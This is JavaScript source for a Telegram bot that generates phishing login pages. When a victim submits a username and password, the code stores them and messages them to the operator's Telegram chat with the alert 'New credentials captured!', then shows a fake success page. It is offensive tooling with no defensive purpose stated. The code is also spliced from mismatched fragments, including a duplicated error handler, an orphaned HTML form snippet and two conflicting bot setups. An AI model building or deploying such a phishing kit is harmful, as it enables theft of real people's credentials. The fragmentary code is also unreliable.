const { Telegraf } = require('telegraf');
const micro = require('micro');

// Initialize Telegraf bot with your token from environment variables
const bot = new Telegraf(process.env.BOT_TOKEN);

// Define bot commands
bot.start((ctx) => ctx.reply('Welcome to the fake page generator bot! Use /create <username> <password> to generate a new link with specific credentials.'));
bot.help((ctx) => ctx.reply('Use /create <username> <password> to generate a fake login page link. If no username/password is provided, it will generate a generic one.'));

bot.command('create', async (ctx) => {
    const requesterUserId = ctx.from.id; // The ID of the user who requested the link
    const args = ctx.message.text.split(' ').slice(1); // Get arguments after /create

    let usernameToEmbed = 'user'; // Default username
    let passwordToEmbed = 'password123'; // Default password

    if (args.length === 2) {
        usernameToEmbed = args[0];
        passwordToEmbed = args[1];
    } else if (args.length > 0 && args.length !== 2) {
        return ctx.reply('Usage: /create <username> <password>\nExample: /create victim@example.com strongpass');
    }

    // Generate a unique identifier. We'll embed the requesterUserId here.
    // The format will be: [random_hash]_[requesterUserId]
    const randomHash = Math.random().toString(36).substring(2, 10);
    const uniqueIdWithTarget = `${randomHash}_${requesterUserId}`;

    // Get the base URL from Vercel's environment variables
    const baseUrl = process.env.BASE_URL || process.env.VERCEL_URL;

    if (!baseUrl) {
        return ctx.reply('Error: BASE_URL or VERCEL_URL environment variable is not set. Cannot generate link. Please check Vercel project settings.');
    }

    // Construct the phishing link with the embedded target ID
    const phishingLink = `${baseUrl}/phish/${uniqueIdWithTarget}`;

    ctx.reply(`Generated a new fake login link for you:\n\`${phishingLink}\`\n\n**Expected Login (for reference):**\nUsername: \`${usernameToEmbed}\`\nPassword: \`${passwordToEmbed}\`\n\nAny credentials submitted will be sent to your chat.`, { parse_mode: 'Markdown' });
});

// This is the main serverless function for the Telegram webhook.
module.exports = async (req, res) => {
    try {
        await bot.handleUpdate(req.body); // Let Telegraf handle the update
        res.statusCode = 200;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ success: true }));
    } catch (error) {
        console.error('Error handling Telegram update:', error);
        res.statusCode = 500;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ error: 'Internal Server Error', details: error.message }));
    }
};    } catch (error) {
        console.error('Error handling Telegram update:', error);
        res.statusCode = 500;
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ error: 'Internal Server Error', details: error.message }));
    }
};                <input type="text" name="username" placeholder="Username" required><br>
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
    `);
});

app.post('/submit/:pageId', (req, res) => {
    const pageId = req.params.pageId;
    const { username, password } = req.body;
    
    // Store credentials
    capturedData[pageId] = { username, password };
    
    // Send to Telegram
    bot.telegram.sendMessage(
        TARGET_USER_ID,
        `🔥 New credentials captured!\nPage ID: ${pageId}\nUsername: ${username}\nPassword: ${password}`
    );
    
    // Redirect to real site or show fake success
    res.send('Login successful! Redirecting...');
});

// Original bot handlers remain
bot.start((ctx) => ctx.reply('Welcome to your Telegram bot!'));
bot.help((ctx) => ctx.reply('Send /create to generate a phishing page'));
bot.on('text', (ctx) => ctx.reply(`You said: ${ctx.message.text}`));

// Webhook handling
app.post('/api/bot', async (req, res) => {
    try {
        await bot.handleUpdate(req.body, res);
    } catch (error) {
        console.error('Error handling update:', error);
        res.status(500).send('Error processing update');
    }
});

app.get('/api/bot', (req, res) => {
    res.send('Bot is running');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
